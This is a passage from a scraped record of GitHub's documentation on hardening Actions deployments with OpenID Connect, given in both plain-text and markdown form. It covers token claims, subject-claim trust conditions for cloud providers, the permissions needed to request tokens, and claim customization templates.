\"runner_environment\": \"github-hosted\", \"actor\": \"octocat\", \"workflow\": \"example-workflow\", \"head_ref\": \"\", \"base_ref\": \"\", \"event_name\": \"workflow_dispatch\", \"ref_type\": \"branch\", \"job_workflow_ref\": \"octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\", \"iss\": \"https://token.actions.githubusercontent.com\", \"nbf\": 1632492967, \"exp\": 1632493867, \"iat\": 1632493567 } \nTo see all the claims supported by GitHub's OIDC provider, review the claims_supported entries at https://token.actions.githubusercontent.com/.well-known/openid-configuration.\nThe token includes the standard audience, issuer, and subject claims.\nClaimClaim typeDescription\naud\tAudience\tBy default, this is the URL of the repository owner, such as the organization that owns the repository. You can set a custom audience with a toolkit command: core.getIDToken(audience)\t\niss\tIssuer\tThe issuer of the OIDC token: https://token.actions.githubusercontent.com\t\nsub\tSubject\tDefines the subject claim that is to be validated by the cloud provider. This setting is essential for making sure that access tokens are only allocated in a predictable way.\t\nThe OIDC token also includes additional standard JOSE header parameters and claims.\nHeader ParameterParameter typeDescription\nalg\tAlgorithm\tThe algorithm used by the OIDC provider.\t\nkid\tKey identifier\tUnique key for the OIDC token.\t\ntyp\tType\tDescribes the type of token. This is a JSON Web Token (JWT).\t\nClaimClaim typeDescription\nexp\tExpires at\tIdentifies the expiry time of the JWT.\t\niat\tIssued at\tThe time when the JWT was issued.\t\njti\tJWT token identifier\tUnique identifier for the OIDC token.\t\nnbf\tNot before\tJWT is not valid for use before this time.\t\nThe token also includes custom claims provided by GitHub.\nClaimDescription\nactor\tThe personal account that initiated the workflow run.\t\nactor_id\tThe ID of personal account that initiated the workflow run.\t\nbase_ref\tThe target branch of the pull request in a workflow run.\t\nenvironment\tThe name of the environment used by the job. If the environment claim is included (also via include_claim_keys), an environment is required and must be provided.\t\nevent_name\tThe name of the event that triggered the workflow run.\t\nhead_ref\tThe source branch of the pull request in a workflow run.\t\njob_workflow_ref\tFor jobs using a reusable workflow, the ref path to the reusable workflow. For more information, see Using OpenID Connect with reusable workflows.\t\njob_workflow_sha\tFor jobs using a reusable workflow, the commit SHA for the reusable workflow file.\t\nref\t(Reference) The git ref that triggered the workflow run.\t\nref_type\tThe type of ref, for example: \"branch\".\t\nrepository_visibility\tThe visibility of the repository where the workflow is running. Accepts the following values: internal, private, or public.\t\nrepository\tThe repository from where the workflow is running.\t\nrepository_id\tThe ID of the repository from where the workflow is running.\t\nrepository_owner\tThe name of the organization in which the repository is stored.\t\nrepository_owner_id\tThe ID of the organization in which the repository is stored.\t\nrun_id\tThe ID of the workflow run that triggered the workflow.\t\nrun_number\tThe number of times this workflow has been run.\t\nrun_attempt\tThe number of times this workflow run has been retried.\t\nrunner_environment\tThe type of runner used by the job. Accepts the following values: github-hosted or self-hosted.\t\nworkflow\tThe name of the workflow.\t\nworkflow_ref\tThe ref path to the workflow. For example, octocat/hello-world/.github/workflows/my-workflow.yml@refs/heads/my_branch.\t\nworkflow_sha\tThe commit SHA for the workflow file.\t\nDefining trust conditions on cloud roles using OIDC claims\nWith OIDC, a GitHub Actions workflow requires a token in order to access resources in your cloud provider. The workflow requests an access token from your cloud provider, which checks the details presented by the JWT. If the trust configuration in the JWT is a match, your cloud provider responds by issuing a temporary token to the workflow, which can then be used to access resources in your cloud provider. You can configure your cloud provider to only respond to requests that originate from a specific organization's repository. You can also specify additional conditions, described below.\nAudience and Subject claims are typically used in combination while setting conditions on the cloud role/resources to scope its access to the GitHub workflows.\nAudience: By default, this value uses the URL of the organization or repository owner. This can be used to set a condition that only the workflows in the specific organization can access the cloud role.\nSubject: By default, has a predefined format and is a concatenation of some of the key metadata about the workflow, such as the GitHub organization, repository, branch, or associated job environment. See Example subject claims to see how the subject claim is assembled from concatenated metadata.\nIf you need more granular trust conditions, you can customize the subject (sub) claim that's included with the JWT. For more information, see Customizing the token claims.\nThere are also many additional claims supported in the OIDC token that can be used for setting these conditions. In addition, your cloud provider could allow you to assign a role to the access tokens, letting you specify even more granular permissions.\nNote\nTo control how your cloud provider issues access tokens, you must define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources.\nExample subject claims\nThe following examples demonstrate how to use \"Subject\" as a condition, and explain how the \"Subject\" is assembled from concatenated metadata. The subject uses information from the job context, and instructs your cloud provider that access token requests may only be granted for requests from workflows running in specific branches, environments. The following sections describe some common subjects you can use.\nFiltering for a specific environment\nThe subject claim includes the environment name when the job references an environment.\nYou can configure a subject that filters for a specific environment name. In this example, the workflow run must have originated from a job that has an environment named Production, in a repository named octo-repo that is owned by the octo-org organization:\nSyntax: repo:ORG-NAME/REPO-NAME:environment:ENVIRONMENT-NAME\nExample: repo:octo-org/octo-repo:environment:Production\nFiltering for pull_request events\nThe subject claim includes the pull_request string when the workflow is triggered by a pull request event, but only if the job doesn't reference an environment.\nYou can configure a subject that filters for the pull_request event. In this example, the workflow run must have been triggered by a pull_request event in a repository named octo-repo that is owned by the octo-org organization:\nSyntax: repo:ORG-NAME/REPO-NAME:pull_request\nExample: repo:octo-org/octo-repo:pull_request\nFiltering for a specific branch\nThe subject claim includes the branch name of the workflow, but only if the job doesn't reference an environment, and if the workflow is not triggered by a pull request event.\nYou can configure a subject that filters for a specific branch name. In this example, the workflow run must have originated from a branch named demo-branch, in a repository named octo-repo that is owned by the octo-org organization:\nSyntax: repo:ORG-NAME/REPO-NAME:ref:refs/heads/BRANCH-NAME\nExample: repo:octo-org/octo-repo:ref:refs/heads/demo-branch\nFiltering for a specific tag\nThe subject claim includes the tag name of the workflow, but only if the job doesn't reference an environment, and if the workflow is not triggered by a pull request event.\nYou can create a subject that filters for specific tag. In this example, the workflow run must have originated with a tag named demo-tag, in a repository named octo-repo that is owned by the octo-org organization:\nSyntax: repo:ORG-NAME/REPO-NAME:ref:refs/tags/TAG-NAME\nExample: repo:octo-org/octo-repo:ref:refs/tags/demo-tag\nConfiguring the subject in your cloud provider\nTo configure the subject in your cloud provider's trust relationship, you must add the subject string to its trust configuration. The following examples demonstrate how various cloud providers can accept the same repo:octo-org/octo-repo:ref:refs/heads/demo-branch subject in different ways:\nCloud providerExample\nAmazon Web Services\t\"token.actions.githubusercontent.com:sub\": \"repo:octo-org/octo-repo:ref:refs/heads/demo-branch\"\t\nAzure\trepo:octo-org/octo-repo:ref:refs/heads/demo-branch\t\nGoogle Cloud Platform\t(assertion.sub=='repo:octo-org/octo-repo:ref:refs/heads/demo-branch')\t\nHashiCorp Vault\tbound_subject=\"repo:octo-org/octo-repo:ref:refs/heads/demo-branch\"\t\nFor more information, see the guides listed in Enabling OpenID Connect for your cloud provider.\nUpdating your actions for OIDC\nTo update your custom actions to authenticate using OIDC, you can use getIDToken() from the Actions toolkit to request a JWT from GitHub's OIDC provider. For more information, see \"OIDC Token\" in the npm package documentation.\nYou could also use a curl command to request the JWT, using the following environment variables.\nVariableDescription\nACTIONS_ID_TOKEN_REQUEST_URL\tThe URL for GitHub's OIDC provider.\t\nACTIONS_ID_TOKEN_REQUEST_TOKEN\tBearer token for the request to the OIDC provider.\t\nFor example:\nShell\ncurl -H \"Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \"$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange\" \nAdding permissions settings\nThe job or workflow run requires a permissions setting with id-token: write to allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if the permissions for id-token is not set to write, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information see About security hardening with OpenID Connect.\nThe id-token: write setting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:\nUsing environment variables on the runner (ACTIONS_ID_TOKEN_REQUEST_URL and ACTIONS_ID_TOKEN_REQUEST_TOKEN).\nUsing getIDToken() from the Actions toolkit.\nIf you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:\nYAML\npermissions: id-token: write # This is required for requesting the JWT contents: read # This is required for actions/checkout \nIf you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:\nYAML\npermissions: id-token: write # This is required for requesting the JWT \nYou may need to specify additional permissions here, depending on your workflow's requirements.\nFor reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context. For reusable workflows outside your enterprise or organization, the permissions setting for id-token should be explicitly set to write at the caller workflow level or in the specific job that calls the reusable workflow. This ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended.\nFor more information, see Reusing workflows.\nCustomizing the token claims\nYou can security harden your OIDC configuration by customizing the claims that are included with the JWT. These customizations allow you to define more granular trust conditions on your cloud roles when allowing your workflows to access resources hosted in the cloud:\nYou can customize values for audience claims. See Customizing the audience value.\nYou can customize the format of your OIDC configuration by setting conditions on the subject (sub) claim that require JWT tokens to originate from a specific repository, reusable workflow, or other source.\nYou can define granular OIDC policies by using additional OIDC token claims, such as repository_id and repository_visibility. See Understanding the OIDC token.\nCustomizing the audience value\nWhen you use custom actions in your workflows, those actions may use the GitHub Actions Toolkit to enable you to supply a custom value for the audience claim. Some cloud providers also use this in their official login actions to enforce a default value for the audience claim. For example, the GitHub Action for Azure Login provides a default aud value of api://AzureADTokenExchange, or it allows you to set a custom aud value in your workflows. For more information on the GitHub Actions Toolkit, see the OIDC token section in the documentation.\nIf you do not want to use the default aud value offered by an action, you can provide a custom value for the audience claim. This allows you to set a condition that only workflows in a specific repository or organization can access the cloud role. If the action you are using supports this, you can use the with keyword in your workflow to pass a custom aud value to the action. For more information, see Metadata syntax for GitHub Actions.\nCustomizing the subject claims for an organization or repository\nTo help improve security, compliance, and standardization, you can customize the standard claims to suit your required access conditions. If your cloud provider supports conditions on subject claims, you can create a condition that checks whether the sub value matches the path of the reusable workflow, such as \"job_workflow_ref:octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\". The exact format will vary depending on your cloud provider's OIDC configuration. To configure the matching condition on GitHub, you can use the REST API to require that the sub claim must always include a specific custom claim, such as job_workflow_ref. You can use the REST API to apply a customization template for the OIDC subject claim; for example, you can require that the sub claim within the OIDC token must always include a specific custom claim, such as job_workflow_ref. For more information, see REST API endpoints for GitHub Actions OIDC.\nNote\nWhen the organization template is applied, it will not affect any workflows already using OIDC unless their repository has opted in to custom organization templates. For all repositories, existing and new, the repository owner will need to use the repository-level REST API to opt in to receive this configuration by setting use_default to false. Alternatively, the repository owner could use the REST API to apply a different configuration specific to the repository. For more information, see REST API endpoints for GitHub Actions OIDC.\nCustomizing the claims results in a new format for the entire sub claim, which replaces the default predefined sub format in the token described in About security hardening with OpenID Connect.\nNote\nThe sub claim uses the shortened form repo (for example, repo:ORG-NAME/REPO-NAME) instead of repository to reference the repository. Any : within the context value will be replaced with %3A.\nThe following example templates demonstrate various ways to customize the subject claim. To configure these settings on GitHub, admins use the REST API to specify a list of claims that must be included in the subject (sub) claim.\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see REST API endpoints for GitHub Actions OIDC, and for repositories, see REST API endpoints for GitHub Actions OIDC.\nTo customize your subject claims, you should first create a matching condition in your cloud provider's OIDC configuration, before customizing the configuration using the REST API. Once the configuration is completed, each time a new job runs, the OIDC token generated during that job will follow the new customization template. If the matching condition doesn't exist in the cloud provider's OIDC configuration before the job runs, the generated token might not be accepted by the cloud provider, since the cloud conditions may not be synchronized.\nExample: Allowing repository based on visibility and owner\nThis example template allows the sub claim to have a new format, using repository_owner and repository_visibility:\n{ \"include_claim_keys\": [ \"repository_owner\", \"repository_visibility\" ] } \nIn your cloud provider's OIDC configuration, configure the sub condition to require that claims must include specific values for repository_owner and repository_visibility. For example: \"sub\": \"repository_owner:monalisa:repository_visibility:private\". The approach lets you restrict cloud role access to only private repositories within an organization or enterprise.\nExample: Allowing access to all repositories with a specific owner\nThis example template enables the sub claim to have a new format with only the value of repository_owner.\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see REST API endpoints for GitHub Actions OIDC, and for repositories, see REST API endpoints for GitHub Actions OIDC.\n{ \"include_claim_keys\": [ \"repository_owner\" ] } \nIn your cloud provider's OIDC configuration, configure the sub condition to require that claims must include a specific value for repository_owner. For example: \"sub\": \"repository_owner:monalisa\"\nExample: Requiring a reusable workflow\nThis example template allows the sub claim to have a new format that contains the value of the job_workflow_ref claim. This enables an enterprise to use reusable workflows to enforce consistent deployments across its organizations and repositories.\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see REST API endpoints for GitHub Actions OIDC, and for repositories, see REST API endpoints for GitHub Actions OIDC.\n{ \"include_claim_keys\": [ \"job_workflow_ref\" ] } \nIn your cloud provider's OIDC configuration, configure the sub condition to require that claims must include a specific value for job_workflow_ref. For example: \"sub\": \"job_workflow_ref:octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\".\nExample: Requiring a reusable workflow and other claims\nThe following example template combines the requirement of a specific reusable workflow with additional claims.\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see REST API endpoints for GitHub Actions OIDC, and for repositories, see REST API endpoints for GitHub Actions OIDC.\nThis example also demonstrates how to use \"context\" to define your conditions. This is the part that follows the repository in the default sub format. For example, when the job references an environment, the context contains: environment:ENVIRONMENT-NAME.\n{ \"include_claim_keys\": [ \"repo\", \"context\", \"job_workflow_ref\" ] } \nIn your cloud provider's OIDC configuration, configure the sub condition to require that claims must include specific values for repo, context, and job_workflow_ref.\nThis customization template requires that the sub uses the following format: repo:ORG-NAME/REPO-NAME:environment:ENVIRONMENT-NAME:job_workflow_ref:REUSABLE-WORKFLOW-PATH. For example: \"sub\": \"repo:octo-org/octo-repo:environment:prod:job_workflow_ref:octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\"\nExample: Granting access to a specific repository\nThis example template lets you grant cloud access to all the workflows in a specific repository, across all branches/tags and environments.\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see REST API endpoints for GitHub Actions OIDC, and for repositories, see REST API endpoints for GitHub Actions OIDC.\n{ \"include_claim_keys\": [ \"repo\" ] } \nIn your cloud provider's OIDC configuration, configure the sub condition to require a repo claim that matches the required value.\nExample: Using system-generated GUIDs\nThis example template enables predictable OIDC claims with system-generated GUIDs that do not change between renames of entities (such as renaming a repository).\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see REST API endpoints for GitHub Actions OIDC, and for repositories, see REST API endpoints for GitHub Actions OIDC.\n{ \"include_claim_keys\": [ \"repository_id\" ] } \nIn your cloud provider's OIDC configuration, configure the sub condition to require a repository_id claim that matches the required value.\nor:\n{ \"include_claim_keys\": [ \"repository_owner_id\" ] } \nIn your cloud provider's OIDC configuration, configure the sub condition to require a repository_owner_id claim that matches the required value.\nExample: Context value with :\nThis example demonstrates how to handle context value with :. For example, when the job references an environment named production:eastus.\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see REST API endpoints for GitHub Actions OIDC, and for repositories, see REST API endpoints for GitHub Actions OIDC.\n{ \"include_claim_keys\": [ \"environment\", \"repository_owner\" ] } \nIn your cloud provider's OIDC configuration, configure the sub condition to require that claims must include a specific value for environment and repository_owner. For example: \"sub\": \"environment:production%3Aeastus:repository_owner:octo-org\".\nResetting organization template customizations\nThis example template resets the subject claims to the default format. This template effectively opts out of any organization-level customization policy.\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see REST API endpoints for GitHub Actions OIDC, and for repositories, see REST API endpoints for GitHub Actions OIDC.\n{ \"include_claim_keys\": [ \"repo\", \"context\" ] } \nIn your cloud provider's OIDC configuration, configure the sub condition to require that claims must include specific values for repo and context.\nResetting repository template customizations\nAll repositories in an organization have the ability to opt in or opt out of (organization and repository-level) customized sub claim templates.\nTo opt out a repository and reset back to the default sub claim format, a repository administrator must use the REST API endpoint at REST API endpoints for GitHub Actions OIDC.\nTo configure repositories to use the default sub claim format, use the PUT /repos/{owner}/{repo}/actions/oidc/customization/sub REST API endpoint at with the following request body.\n{ \"use_default\": true } \nExample: Configuring a repository to use an organization template\nOnce an organization has created a customized sub claim template, the REST API can be used to programmatically apply the template to repositories within the organization. A repository administrator can configure their repository to use the template created by the administrator of their organization.\nTo configure the repository to use the organization's template, a repository admin must use the PUT /repos/{owner}/{repo}/actions/oidc/customization/sub REST API endpoint at with the following request body. For more information, see REST API endpoints for GitHub Actions OIDC.\n{ \"use_default\": false } \nUpdating your workflows for OIDC\nYou can now update your YAML workflows to use OIDC access tokens instead of secrets. Popular cloud providers have published their official login actions that make it easy for you to get started with OIDC. For more information about updating your workflows, see the cloud-specific guides listed below in Enabling OpenID Connect for your cloud provider.\nEnabling OpenID Connect for Python package publishing\nYou can use a GitHub Actions workflow in a repository as a trusted publisher for a PyPI project. Using a workflow as a trusted publisher allows OIDC access tokens to be exchanged for temporary PyPI API tokens. For more information, see Configuring OpenID Connect in PyPI and Publishing to PyPI with a Trusted Publisher in the PyPI documentation.\nEnabling OpenID Connect for your cloud provider\nTo enable and configure OIDC for your specific cloud provider, see the following guides:\nConfiguring OpenID Connect in Amazon Web Services\nConfiguring OpenID Connect in Azure\nConfiguring OpenID Connect in Google Cloud Platform\nConfiguring OpenID Connect in HashiCorp Vault\nTo enable and configure OIDC for another cloud provider, see the following guide:\nConfiguring OpenID Connect in cloud providers\nDebugging your OIDC claims\nYou can use the github/actions-oidc-debugger action to visualize the claims that would be sent, before integrating with a cloud provider. This action requests a JWT and prints the claims included within the JWT that were received from GitHub Actions.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-about-security-hardening-with-openid-connect-p6ry8.html",
  "markdown": "# About security hardening with OpenID Connect\n\nOpenID Connect allows your workflows to exchange short-lived tokens directly from your cloud provider.\n\n## [Overview of OpenID Connect](#overview-of-openid-connect)\n\nGitHub Actions workflows are often designed to access a cloud provider (such as AWS, Azure, GCP, or HashiCorp Vault) in order to deploy software or use the cloud's services. Before the workflow can access these resources, it will supply credentials, such as a password or token, to the cloud provider. These credentials are usually stored as a secret in GitHub, and the workflow presents this secret to the cloud provider every time it runs.\n\nHowever, using hardcoded secrets requires you to create credentials in the cloud provider and then duplicate them in GitHub as a secret.\n\nWith OpenID Connect (OIDC), you can take a different approach by configuring your workflow to request a short-lived access token directly from the cloud provider. Your cloud provider also needs to support OIDC on their end, and you must configure a trust relationship that controls which workflows are able to request the access tokens. Providers that currently support OIDC include Amazon Web Services, Azure, Google Cloud Platform, and HashiCorp Vault, among others.\n\n### [Benefits of using OIDC](#benefits-of-using-oidc)\n\nBy updating your workflows to use OIDC tokens, you can adopt the following good security practices:\n\n*   **No cloud secrets:** You won't need to duplicate your cloud credentials as long-lived GitHub secrets. Instead, you can configure the OIDC trust on your cloud provider, and then update your workflows to request a short-lived access token from the cloud provider through OIDC.\n*   **Authentication and authorization management:** You have more granular control over how workflows can use credentials, using your cloud provider's authentication (authN) and authorization (authZ) tools to control access to cloud resources.\n*   **Rotating credentials:** With OIDC, your cloud provider issues a short-lived access token that is only valid for a single job, and then automatically expires.\n\n### [Getting started with OIDC](#getting-started-with-oidc)\n\nThe following diagram gives an overview of how GitHub's OIDC provider integrates with your workflows and cloud provider:\n\n![Diagram of how a cloud provider integrates with GitHub Actions through access tokens and JSON web token cloud role IDs.](https://docs.github.com/assets/cb-63262/images/help/actions/oidc-architecture.png)\n\n1.  In your cloud provider, create an OIDC trust between your cloud role and your GitHub workflow(s) that need access to the cloud.\n2.  Every time your job runs, GitHub's OIDC Provider auto-generates an OIDC token. This token contains multiple claims to establish a security-hardened and verifiable identity about the specific workflow that is trying to authenticate.\n3.  You could include a step or action in your job to request this token from GitHub's OIDC provider, and present it to the cloud provider.\n4.  Once the cloud provider successfully validates the claims presented in the token, it then provides a short-lived cloud access token that is available only for the duration of the job.\n\n## [Configuring the OIDC trust with the cloud](#configuring-the-oidc-trust-with-the-cloud)\n\nWhen you configure your cloud to trust GitHub's OIDC provider, you **must** add conditions that filter incoming requests, so that untrusted repositories or workflows can’t request access tokens for your cloud resources:\n\n*   Before granting an access token, your cloud provider checks that the [`subject`](https://openid.net/specs/openid-connect-core-1_0.html#StandardClaims) and other claims used to set conditions in its trust settings match those in the request's JSON Web Token (JWT). As a result, you must take care to correctly define the _subject_ and other conditions in your cloud provider.\n*   The OIDC trust configuration steps and the syntax to set conditions for cloud roles (using _Subject_ and other claims) will vary depending on which cloud provider you're using. For some examples, see [Example subject claims](#example-subject-claims).\n\n### [Understanding the OIDC token](#understanding-the-oidc-token)\n\nEach job requests an OIDC token from GitHub's OIDC provider, which responds with an automatically generated JSON web token (JWT) that is unique for each workflow job where it is generated. When the job runs, the OIDC token is presented to the cloud provider. To validate the token, the cloud provider checks if the OIDC token's subject and other claims are a match for the conditions that were preconfigured on the cloud role's OIDC trust definition.\n\nThe following example OIDC token uses a subject (`sub`) that references a job environment named `prod` in the `octo-org/octo-repo` repository.\n\n```\n{\n  \"typ\": \"JWT\",\n  \"alg\": \"RS256\",\n  \"x5t\": \"example-thumbprint\",\n  \"kid\": \"example-key-id\"\n}\n{\n  \"jti\": \"example-id\",\n  \"sub\": \"repo:octo-org/octo-repo:environment:prod\",\n  \"environment\": \"prod\",\n  \"aud\": \"https://github.com/octo-org\",\n  \"ref\": \"refs/heads/main\",\n  \"sha\": \"example-sha\",\n  \"repository\": \"octo-org/octo-repo\",\n  \"repository_owner\": \"octo-org\",\n  \"actor_id\": \"12\",\n  \"repository_visibility\": \"private\",\n  \"repository_id\": \"74\",\n  \"repository_owner_id\": \"65\",\n  \"run_id\": \"example-run-id\",\n  \"run_number\": \"10\",\n  \"run_attempt\": \"2\",\n  \"runner_environment\": \"github-hosted\",\n  \"actor\": \"octocat\",\n  \"workflow\": \"example-workflow\",\n  \"head_ref\": \"\",\n  \"base_ref\": \"\",\n  \"event_name\": \"workflow_dispatch\",\n  \"ref_type\": \"branch\",\n  \"job_workflow_ref\": \"octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\",\n  \"iss\": \"https://token.actions.githubusercontent.com\",\n  \"nbf\": 1632492967,\n  \"exp\": 1632493867,\n  \"iat\": 1632493567\n}\n```\n\nTo see all the claims supported by GitHub's OIDC provider, review the `claims_supported` entries at [https://token.actions.githubusercontent.com/.well-known/openid-configuration](https://token.actions.githubusercontent.com/.well-known/openid-configuration).\n\nThe token includes the standard audience, issuer, and subject claims.\n\n| Claim | Claim type | Description |\n| --- | --- | --- |\n| `aud` | Audience | By default, this is the URL of the repository owner, such as the organization that owns the repository. You can set a custom audience with a toolkit command: [`core.getIDToken(audience)`](https://www.npmjs.com/package/@actions/core/v/1.6.0) |\n| `iss` | Issuer | The issuer of the OIDC token: `https://token.actions.githubusercontent.com` |\n| `sub` | Subject | Defines the subject claim that is to be validated by the cloud provider. This setting is essential for making sure that access tokens are only allocated in a predictable way. |\n\nThe OIDC token also includes additional standard JOSE header parameters and claims.\n\n| Header Parameter | Parameter type | Description |\n| --- | --- | --- |\n| `alg` | Algorithm | The algorithm used by the OIDC provider. |\n| `kid` | Key identifier | Unique key for the OIDC token. |\n| `typ` | Type | Describes the type of token. This is a JSON Web Token (JWT). |\n\n| Claim | Claim type | Description |\n| --- | --- | --- |\n| `exp` | Expires at | Identifies the expiry time of the JWT. |\n| `iat` | Issued at | The time when the JWT was issued. |\n| `jti` | JWT token identifier | Unique identifier for the OIDC token. |\n| `nbf` | Not before | JWT is not valid for use before this time. |\n\nThe token also includes custom claims provided by GitHub.\n\n| Claim | Description |\n| --- | --- |\n| `actor` | The personal account that initiated the workflow run. |\n| `actor_id` | The ID of personal account that initiated the workflow run. |\n| `base_ref` | The target branch of the pull request in a workflow run. |\n| `environment` | The name of the environment used by the job. If the `environment` claim is included (also via `include_claim_keys`), an environment is required and must be provided. |\n| `event_name` | The name of the event that triggered the workflow run. |\n| `head_ref` | The source branch of the pull request in a workflow run. |\n| `job_workflow_ref` | For jobs using a reusable workflow, the ref path to the reusable workflow. For more information, see [Using OpenID Connect with reusable workflows](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/using-openid-connect-with-reusable-workflows). |\n| `job_workflow_sha` | For jobs using a reusable workflow, the commit SHA for the reusable workflow file. |\n| `ref` | _(Reference)_ The git ref that triggered the workflow run. |\n| `ref_type` | The type of `ref`, for example: \"branch\". |\n| `repository_visibility` | The visibility of the repository where the workflow is running. Accepts the following values: `internal`, `private`, or `public`. |\n| `repository` | The repository from where the workflow is running. |\n| `repository_id` | The ID of the repository from where the workflow is running. |\n| `repository_owner` | The name of the organization in which the `repository` is stored. |\n| `repository_owner_id` | The ID of the organization in which the `repository` is stored. |\n| `run_id` | The ID of the workflow run that triggered the workflow. |\n| `run_number` | The number of times this workflow has been run. |\n| `run_attempt` | The number of times this workflow run has been retried. |\n| `runner_environment` | The type of runner used by the job. Accepts the following values: `github-hosted` or `self-hosted`. |\n| `workflow` | The name of the workflow. |\n| `workflow_ref` | The ref path to the workflow. For example, `octocat/hello-world/.github/workflows/my-workflow.yml@refs/heads/my_branch`. |\n| `workflow_sha` | The commit SHA for the workflow file. |\n\n### [Defining trust conditions on cloud roles using OIDC claims](#defining-trust-conditions-on-cloud-roles-using-oidc-claims)\n\nWith OIDC, a GitHub Actions workflow requires a token in order to access resources in your cloud provider. The workflow requests an access token from your cloud provider, which checks the details presented by the JWT. If the trust configuration in the JWT is a match, your cloud provider responds by issuing a temporary token to the workflow, which can then be used to access resources in your cloud provider. You can configure your cloud provider to only respond to requests that originate from a specific organization's repository. You can also specify additional conditions, described below.\n\nAudience and Subject claims are typically used in combination while setting conditions on the cloud role/resources to scope its access to the GitHub workflows.\n\n*   **Audience:** By default, this value uses the URL of the organization or repository owner. This can be used to set a condition that only the workflows in the specific organization can access the cloud role.\n*   **Subject:** By default, has a predefined format and is a concatenation of some of the key metadata about the workflow, such as the GitHub organization, repository, branch, or associated [`job`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idenvironment) environment. See [Example subject claims](#example-subject-claims) to see how the subject claim is assembled from concatenated metadata.\n\nIf you need more granular trust conditions, you can customize the subject (`sub`) claim that's included with the JWT. For more information, see [Customizing the token claims](#customizing-the-token-claims).\n\nThere are also many additional claims supported in the OIDC token that can be used for setting these conditions. In addition, your cloud provider could allow you to assign a role to the access tokens, letting you specify even more granular permissions.\n\nNote\n\nTo control how your cloud provider issues access tokens, you **must** define at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources.\n\n### [Example subject claims](#example-subject-claims)\n\nThe following examples demonstrate how to use \"Subject\" as a condition, and explain how the \"Subject\" is assembled from concatenated metadata. The [subject](https://openid.net/specs/openid-connect-core-1_0.html#StandardClaims) uses information from the [`job` context](https://docs.github.com/en/actions/learn-github-actions/contexts#job-context), and instructs your cloud provider that access token requests may only be granted for requests from workflows running in specific branches, environments. The following sections describe some common subjects you can use.\n\n#### [Filtering for a specific environment](#filtering-for-a-specific-environment)\n\nThe subject claim includes the environment name when the job references an environment.\n\nYou can configure a subject that filters for a specific [environment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment) name. In this example, the workflow run must have originated from a job that has an environment named `Production`, in a repository named `octo-repo` that is owned by the `octo-org` organization:\n\n*   Syntax: `repo:ORG-NAME/REPO-NAME:environment:ENVIRONMENT-NAME`\n*   Example: `repo:octo-org/octo-repo:environment:Production`\n\n#### [Filtering for `pull_request` events](#filtering-for-pull_request-events)\n\nThe subject claim includes the `pull_request` string when the workflow is triggered by a pull request event, but only if the job doesn't reference an environment.\n\nYou can configure a subject that filters for the [`pull_request`](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request) event. In this example, the workflow run must have been triggered by a `pull_request` event in a repository named `octo-repo` that is owned by the `octo-org` organization:\n\n*   Syntax: `repo:ORG-NAME/REPO-NAME:pull_request`\n*   Example: `repo:octo-org/octo-repo:pull_request`\n\n#### [Filtering for a specific branch](#filtering-for-a-specific-branch)\n\nThe subject claim includes the branch name of the workflow, but only if the job doesn't reference an environment, and if the workflow is not triggered by a pull request event.\n\nYou can configure a subject that filters for a specific branch name. In this example, the workflow run must have originated from a branch named `demo-branch`, in a repository named `octo-repo` that is owned by the `octo-org` organization:\n\n*   Syntax: `repo:ORG-NAME/REPO-NAME:ref:refs/heads/BRANCH-NAME`\n*   Example: `repo:octo-org/octo-repo:ref:refs/heads/demo-branch`\n\n#### [Filtering for a specific tag](#filtering-for-a-specific-tag)\n\nThe subject claim includes the tag name of the workflow, but only if the job doesn't reference an environment, and if the workflow is not triggered by a pull request event.\n\nYou can create a subject that filters for specific tag. In this example, the workflow run must have originated with a tag named `demo-tag`, in a repository named `octo-repo` that is owned by the `octo-org` organization:\n\n*   Syntax: `repo:ORG-NAME/REPO-NAME:ref:refs/tags/TAG-NAME`\n*   Example: `repo:octo-org/octo-repo:ref:refs/tags/demo-tag`\n\n### [Configuring the subject in your cloud provider](#configuring-the-subject-in-your-cloud-provider)\n\nTo configure the subject in your cloud provider's trust relationship, you must add the subject string to its trust configuration. The following examples demonstrate how various cloud providers can accept the same `repo:octo-org/octo-repo:ref:refs/heads/demo-branch` subject in different ways:\n\n| Cloud provider | Example |\n| --- | --- |\n| Amazon Web Services | `\"token.actions.githubusercontent.com:sub\": \"repo:octo-org/octo-repo:ref:refs/heads/demo-branch\"` |\n| Azure | `repo:octo-org/octo-repo:ref:refs/heads/demo-branch` |\n| Google Cloud Platform | `(assertion.sub=='repo:octo-org/octo-repo:ref:refs/heads/demo-branch')` |\n| HashiCorp Vault | 